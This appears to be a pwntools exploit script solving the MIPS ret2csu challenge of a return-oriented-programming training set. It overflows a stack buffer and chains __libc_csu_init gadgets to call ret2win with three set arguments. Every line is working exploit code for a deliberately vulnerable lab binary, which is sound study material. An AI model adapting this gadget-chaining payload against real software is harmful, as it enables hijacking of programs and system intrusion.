#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/mipsel-linux-gnu"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2csu_mipsel')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./ret2csu_mipsel_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616a)

ARGS = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

# r2 ret2csu_mipsel
# iS
# pd @ 0x00411020 - .got section
# ; DATA XREF from sym.usefulFunction @ 0x400904(r)
# 0x00411058      .dword 0x00400a60 ; sym.imp.ret2win
RET2WIN_GOT = p32(0x411058)

# ropper --arch MIPS --file ret2csu_mipsel
# 0x004009a0: lw $t9, ($s0); addiu $s1, $s1, 1; move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
MOVE_A2_A1_A0 = p32(0x4009a0)

# (gdb) disassemble __libc_csu_init
# 0x004009c0 <+128>:	lw	ra,52(sp)
# 0x004009c4 <+132>:	lw	s5,48(sp)
# 0x004009c8 <+136>:	lw	s4,44(sp)
# 0x004009cc <+140>:	lw	s3,40(sp)
# 0x004009d0 <+144>:	lw	s2,36(sp)
# 0x004009d4 <+148>:	lw	s1,32(sp)
# 0x004009d8 <+152>:	lw	s0,28(sp)
# 0x004009dc <+156>:	jr	ra
# 0x004009e0 <+160>:	addiu	sp,sp,56
CSU_GADGET = p32(0x4009c0)

payload  = padding
payload += CSU_GADGET + 7*p32(0xa5) + RET2WIN_GOT + 2*p32(0xa5)
payload += ARGS + MOVE_A2_A1_A0

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
